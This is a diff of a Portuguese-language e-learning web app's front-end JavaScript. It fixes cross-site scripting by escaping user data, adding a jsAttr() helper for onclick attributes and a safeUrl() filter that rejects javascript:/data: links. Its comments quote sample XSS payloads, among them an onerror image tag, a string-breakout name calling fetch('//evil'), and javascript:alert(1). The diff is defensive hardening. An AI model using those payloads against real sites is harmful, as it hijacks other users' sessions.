@@ -535,12 +535,16 @@ function setupUI(){
 // ── Escape de HTML (XSS) ──────────────────────────────────────────────────
 // Toda string vinda de dado de usuário (nome, texto de pergunta, resposta,
 // comentário, etc.) que for interpolada em innerHTML/template literal como
-// CONTEÚDO de elemento precisa passar por aqui primeiro — sem isto, um
-// aluno/tutor/admin com um nome ou texto tipo "<img src=x onerror=...>"
-// executa script na sessão de QUALQUER OUTRO usuário que veja aquele dado
-// renderizado (achado do ROADMAP.md 2.1, histórico do projeto).
-// Para uso dentro de ATRIBUTO (title="...", aria-label="...") o contexto de
-// escape é o mesmo (& " < > cobre os dois casos), então a mesma função serve.
+// CONTEÚDO de elemento (ou atributo comum: title="...", aria-label="...")
+// precisa passar por aqui primeiro — sem isto, um aluno/tutor/admin com um
+// nome ou texto tipo "<img src=x onerror=...>" executa script na sessão de
+// QUALQUER OUTRO usuário que veja aquele dado renderizado (achado do
+// ROADMAP.md 2.1, histórico do projeto).
+//
+// NÃO usar escapeHtml() sozinho dentro de onclick="fn('${...}')" — o
+// parser HTML decodifica entidades (&#39; → ') no atributo ANTES do JS
+// rodar, então um nome como `x'); fetch('//evil')//` ainda quebra pra
+// fora da string JS mesmo escapado. Pra esse caso, use jsAttr() abaixo.
 function escapeHtml(s){
   if(s == null) return '';
   return String(s)
@@ -549,6 +553,27 @@ function escapeHtml(s){
     .replace(/>/g,'&gt;')
     .replace(/"/g,'&quot;')
     .replace(/'/g,'&#39;');
+}
+
+// Valor seguro pra embutir dentro de onclick="fn(JSATTR)" (SEM aspas
+// próprias ao redor — o literal JS já vem entre aspas duplas do próprio
+// JSON.stringify). JSON.stringify escapa aspas/backslash/controle
+// corretamente para um literal JS; escapeHtml() por cima neutraliza
+// qualquer '/&/</> que sobre pro contexto HTML do atributo. Use SEMPRE
+// com o atributo delimitado por aspas SIMPLES: onclick='fn(${jsAttr(x)})'.
+function jsAttr(v){
+  return escapeHtml(JSON.stringify(v == null ? '' : v));
+}
+
+// URL de material é dado do tutor/admin (Material.url) — usada crua em
+// href="${...}" era um `javascript:alert(1)` de distância de executar no
+// clique de qualquer aluno (entity-escaping não neutraliza esquema de
+// URL). Só http(s):// e caminhos relativos passam; qualquer outra coisa
+// (javascript:, data:, vbscript:) vira '#'.
+function safeUrl(u){
+  const s = String(u || '').trim();
+  if(/^(https?:)?\/\//i.test(s) || /^[.#/]/.test(s)) return escapeHtml(s);
+  return '#';
 }
 
 // ── Login / Logout ──
@@ -935,7 +960,7 @@ async function renderCourseResume(){
 
   document.getElementById('main-content').innerHTML=`
     <div class="course-header">
-      <span class="course-tag">${c.tag}</span>
+      <span class="course-tag">${escapeHtml(c.tag)}</span>
       <h1 class="course-title">${c.icon} ${escapeHtml(c.name)}</h1>
       <div class="course-meta">
         <span>${icon('user-check','14')} ${c.tutor_id&&currentCourse.tutor_name?currentCourse.tutor_name:'Professor IBC'}</span>
@@ -1043,7 +1068,7 @@ function renderAulaPage(){
       </div>
       <div class="material-item-actions">
         ${m.tipo==='pdf'?`<button class="btn btn-outline" onclick="openPdfViewer(${m.id},'${m.name.replace(/'/g,"\\'")}')">${icon('book','14')} Abrir Viewer</button>`:''}
-        <a class="btn btn-outline" href="${m.url}" target="_blank" rel="noopener">${m.tipo==='pdf'?icon('download','14')+' Baixar':icon('share','14')+' Abrir'}</a>
+        <a class="btn btn-outline" href="${safeUrl(m.url)}" target="_blank" rel="noopener">${m.tipo==='pdf'?icon('download','14')+' Baixar':icon('share','14')+' Abrir'}</a>
       </div>
     </div>`).join('');
 
@@ -1099,9 +1124,9 @@ function renderAulaPage(){
         <div class="q-text">${escapeHtml(f.question)}</div>
         <div class="options">
           ${a.quiz[i]&&a.quiz[i].opts?a.quiz[i].opts.map((o,j)=>`<div class="option ${j===f.correct_answer?'correct-ans':(f.selected===j&&!f.is_correct?'wrong-ans':'')}">
-            <input type="radio" disabled ${f.selected===j?'checked':''}><span>${o}</span></div>`).join(''):''}
+            <input type="radio" disabled ${f.selected===j?'checked':''}><span>${escapeHtml(o)}</span></div>`).join(''):''}
         </div>
-        <div class="q-feedback ${f.is_correct?'ok':'err'}">${f.is_correct?icon('check','14')+' Correto!':icon('x','14')+' Incorreto — '+f.explanation}</div>
+        <div class="q-feedback ${f.is_correct?'ok':'err'}">${f.is_correct?icon('check','14')+' Correto!':icon('x','14')+' Incorreto — '+escapeHtml(f.explanation)}</div>
       </div>`).join('') : '';
     exerciseBody = `
       <div class="quiz-body">
@@ -1121,10 +1146,10 @@ function renderAulaPage(){
         ${a.quiz.map((q,i)=>`
           <div class="question-card" id="aqcard-${i}">
             <div class="q-num">Questão ${i+1} de ${a.quiz.length}</div>
-            <div class="q-text">${q.q}</div>
+            <div class="q-text">${escapeHtml(q.q)}</div>
             <div class="options">
               ${q.opts.map((o,j)=>`<div class="option ${aulaQuizAnswers[i]===j?'selected':''}" onclick="selectAulaOpt(${i},${j})">
-                <input type="radio" name="aq${i}" ${aulaQuizAnswers[i]===j?'checked':''} readonly><span>${o}</span></div>`).join('')}
+                <input type="radio" name="aq${i}" ${aulaQuizAnswers[i]===j?'checked':''} readonly><span>${escapeHtml(o)}</span></div>`).join('')}
             </div>
           </div>`).join('')}
         <div class="quiz-actions"><button class="btn btn-primary" onclick="submitAulaQuiz()">Enviar respostas →</button></div>
@@ -1525,7 +1550,7 @@ function renderCourse(){
   const nPendente=currentQuestions.filter(q=>!q.resposta).length;
   document.getElementById('main-content').innerHTML=`
     <div class="course-header">
-      <span class="course-tag">${c.tag}</span>
+      <span class="course-tag">${escapeHtml(c.tag)}</span>
       <h1 class="course-title">${c.icon} ${escapeHtml(c.name)}</h1>
       <div class="course-meta">
         <span>📋 ${(c.modules||[]).length} módulos</span>
@@ -1700,7 +1725,7 @@ function renderMaterial(){
     const isViewing=viewingPDF===i;
     let actions='';
     if(isLink){
-      actions=`<a href="${m.url}" target="_blank" class="btn-view" style="text-decoration:none">Abrir</a>`;
+      actions=`<a href="${safeUrl(m.url)}" target="_blank" class="btn-view" style="text-decoration:none">Abrir</a>`;
     } else if(m.url){
       actions=`<button class="btn-view" onclick="event.stopPropagation();viewPDF(${i})">Ver</button>`;
     }
@@ -1863,10 +1888,10 @@ function renderQuiz(){
         <div class="q-text">${escapeHtml(f.question)}</div>
         <div class="options">
           ${quiz[i]&&quiz[i].opts?quiz[i].opts.map((o,j)=>`<div class="option ${j===f.correct_answer?'correct-ans':(f.selected===j&&!f.is_correct?'wrong-ans':'')}">
-            <input type="radio" disabled ${f.selected===j?'checked':''}><span>${o}</span>
+            <input type="radio" disabled ${f.selected===j?'checked':''}><span>${escapeHtml(o)}</span>
           </div>`).join(''):''}
         </div>
-        <div class="q-feedback ${f.is_correct?'ok':'err'}">${f.is_correct?'✓ Correto!':'✗ Incorreto — '+f.explanation}</div>
+        <div class="q-feedback ${f.is_correct?'ok':'err'}">${f.is_correct?'✓ Correto!':'✗ Incorreto — '+escapeHtml(f.explanation)}</div>
       </div>`).join('');
     return `<div class="quiz-wrap">
       <div class="quiz-header"><div class="quiz-title">Resultado</div><div class="quiz-desc">${escapeHtml(c.name)}</div></div>
@@ -1904,10 +1929,10 @@ function renderQuiz(){
   const questionsHtml=quiz.map((q,i)=>`
     <div class="question-card" id="qcard-${i}">
       <div class="q-num">Questão ${i+1} de ${quiz.length}</div>
-      <div class="q-text">${q.q}</div>
+      <div class="q-text">${escapeHtml(q.q)}</div>
       <div class="options">
         ${q.opts.map((o,j)=>`<div class="option ${quizAnswers[i]===j?'selected':''}" onclick="selectOpt(${i},${j})">
-          <input type="radio" name="q${i}" ${quizAnswers[i]===j?'checked':''} readonly><span>${o}</span>
+          <input type="radio" name="q${i}" ${quizAnswers[i]===j?'checked':''} readonly><span>${escapeHtml(o)}</span>
         </div>`).join('')}
       </div>
     </div>`).join('');
@@ -3002,7 +3027,7 @@ function _renderTutorsContent(tutors, courses, unassignedQs) {
           <div class="question-queue-meta">
             <div class="q-course">${escapeHtml(q.course_name)}</div>
             <div class="q-text">${escapeHtml(q.texto)}</div>
-            <div class="q-author">por ${q.student_name || q.autor}</div>
+            <div class="q-author">por ${escapeHtml(q.student_name || q.autor)}</div>
           </div>
           <div style="display:flex;align-items:center;gap:6px;flex-shrink:0">
             <select class="question-assign-select" id="qsel-${q.id}">
@@ -3276,10 +3301,10 @@ async function openUserProfile(userId) {
     </div>
     <div class="profile-actions">
       <div class="profile-section-title">Ações</div>
-      <button class="btn" style="background:#eee" onclick="openEditUserModal(${userId},'${(u.name||'').replace(/'/g,"\\'")}','${(u.email||'').replace(/'/g,"\\'")}','${u.role}')">${icon('pencil','14')} Editar</button>
+      <button class="btn" style="background:#eee" onclick='openEditUserModal(${userId},${jsAttr(u.name)},${jsAttr(u.email)},${jsAttr(u.role)})'>${icon('pencil','14')} Editar</button>
       <button class="btn" style="background:#eee" onclick="openResetPasswordModal(${userId})">${icon('key','14')} Resetar Senha</button>
       <button class="btn ${u.is_active ? 'btn-danger' : ''}" onclick="toggleUserActive(${userId})">${u.is_active ? 'Desativar' : 'Reativar'}</button>
-      <button class="btn btn-danger" onclick="adminResetUserProgress(${userId},'${escapeHtml(u.name)}')">Zerar progresso (mantém certificados)</button>
+      <button class="btn btn-danger" onclick='adminResetUserProgress(${userId},${jsAttr(u.name)})'>Zerar progresso (mantém certificados)</button>
     </div>`;
 }
 
@@ -3887,7 +3912,7 @@ async function renderStudentDashboard(){
       <div class="course-card stagger-item" onclick="selectCourse(${c.id})">
         <div class="course-card-banner">${c.icon||'📚'}</div>
         <div class="course-card-body">
-          <div class="course-card-tag">${c.tag}</div>
+          <div class="course-card-tag">${escapeHtml(c.tag)}</div>
           <div class="course-card-name">${escapeHtml(c.name)}</div>
           <div class="course-card-meta"><span>📋 ${c._total} aula(s)</span></div>
           <div class="course-card-progress">
@@ -4025,7 +4050,7 @@ async function showBadgesPage(){
       <div style="font-size:1.8rem">${b.unlocked?'✅':'❌'} ${b.icon}</div>
       <div>
         <div style="font-weight:700;color:var(--navy);font-family:var(--font-display)">${escapeHtml(b.name)}</div>
-        <div style="font-size:.78rem;color:var(--muted)">${b.description||''}</div>
+        <div style="font-size:.78rem;color:var(--muted)">${escapeHtml(b.description||'')}</div>
         <div style="font-size:.75rem;color:${b.unlocked?'var(--gold)':'var(--muted)'};margin-top:.2rem">${b.unlocked?'Conquistada: '+new Date(b.unlocked_at).toLocaleDateString('pt-BR'):'Progresso: '+b.progress}</div>
       </div>
     </div>`;
@@ -4626,7 +4651,7 @@ async function renderTutorDashboard(){
       return `<div class="course-card stagger-item" onclick="selectCourse(${c.id})">
         <div class="course-card-banner">${c.icon||'📚'}</div>
         <div class="course-card-body">
-          <div class="course-card-tag">${c.tag}</div>
+          <div class="course-card-tag">${escapeHtml(c.tag)}</div>
           <div class="course-card-name">${escapeHtml(c.name)}</div>
           <div class="course-card-meta">
             <span>📋 ${(c.modules||[]).length} aula(s)</span>
@@ -4639,9 +4664,9 @@ async function renderTutorDashboard(){
   } else {
     const card=(q)=>`<div class="pergunta-card">
       <div class="pergunta-header">
-        <div class="pergunta-avatar">${q.autor?q.autor.charAt(0).toUpperCase():'?'}</div>
+        <div class="pergunta-avatar">${escapeHtml(q.autor?q.autor.charAt(0).toUpperCase():'?')}</div>
         <div class="pergunta-meta">
-          <div class="pergunta-autor">${q.autor||'Aluno'} · <span style="font-weight:400;color:var(--muted)">${q.course_icon||''} ${q.course_name||''}</span></div>
+          <div class="pergunta-autor">${escapeHtml(q.autor||'Aluno')} · <span style="font-weight:400;color:var(--muted)">${q.course_icon||''} ${escapeHtml(q.course_name||'')}</span></div>
           <div class="pergunta-data">${q.created_at?new Date(q.created_at).toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}):''}</div>
         </div>
         <span class="badge-${q.resposta?'respondida':'pendente'}">${q.resposta?'Respondida':'Pendente'}</span>
@@ -4649,7 +4674,7 @@ async function renderTutorDashboard(){
       <div class="pergunta-texto">${escapeHtml(q.texto)}</div>
       ${q.resposta
         ? `<div class="resposta-area"><div class="resposta-avatar">T</div><div class="resposta-texto"><strong>${escapeHtml(q.respondido_por||'Tutor')}:</strong> ${escapeHtml(q.resposta)}</div></div>`
-        : `<div class="resposta-area"><div class="resposta-texto" style="color:var(--muted)"><button class="btn-gold" style="padding:.35rem .9rem;font-size:.78rem" onclick='openAnswerModal(${q.id}, ${JSON.stringify(q.texto)}, ${JSON.stringify(q.autor||"Aluno")})'>Responder</button></div></div>`}
+        : `<div class="resposta-area"><div class="resposta-texto" style="color:var(--muted)"><button class="btn-gold" style="padding:.35rem .9rem;font-size:.78rem" onclick='openAnswerModal(${q.id}, ${jsAttr(q.texto)}, ${jsAttr(q.autor||"Aluno")})'>Responder</button></div></div>`}
     </div>`;
     let html='';
     html+=`<h3 style="font-size:.85rem;color:var(--navy);margin:0 0 .6rem">Sem resposta (${semResposta.length})</h3>`;
@@ -5410,12 +5435,12 @@ async function renderMeuPerfil(){
       <div class="profile-section-title" style="margin-top:var(--space-lg)">${icon('achievements','18','icon--gold')} Conquistas (${earnedCount}/${achievements.length})</div>
       <div class="achievements-grid">
         ${achievements.map(a => `
-          <div class="achievement-card ${a.earned ? 'earned' : 'locked'}" title="${a.description||''}">
+          <div class="achievement-card ${a.earned ? 'earned' : 'locked'}" title="${escapeHtml(a.description||'')}">
             <div class="ach-icon">${a.earned ? a.icon : icon('lock','22')}</div>
             <div class="ach-name">${escapeHtml(a.name)}</div>
             ${a.earned
               ? `<div class="ach-date">Conquistada em ${new Date(a.earned_at).toLocaleDateString('pt-BR')}</div>`
-              : `<div class="ach-desc">${a.description||''}</div>`}
+              : `<div class="ach-desc">${escapeHtml(a.description||'')}</div>`}
           </div>`).join('')}
       </div>
 
@@ -5671,7 +5696,7 @@ async function doVerifyCert(){
               <div style="font-size:.8rem;color:var(--gray)">Código: ${d.cert_code}</div>
             </div>
           </div>
-          <div style="font-size:.95rem;color:var(--dark)"><strong>Aluno:</strong> ${d.student_name}</div>
+          <div style="font-size:.95rem;color:var(--dark)"><strong>Aluno:</strong> ${escapeHtml(d.student_name)}</div>
           <div style="font-size:.95rem;color:var(--dark);margin:.3rem 0"><strong>${d.cert_type==='trail'?'Trilha':'Curso'}:</strong> ${escapeHtml(d.title)}</div>
           <div style="font-size:.85rem;color:var(--gray)">Emitido em: ${new Date(d.issued_at).toLocaleDateString('pt-BR')}</div>
           <button class="btn btn-outline" style="margin-top:1rem" onclick="downloadCertificate('${d.cert_code}')">⬇ Baixar PDF</button>
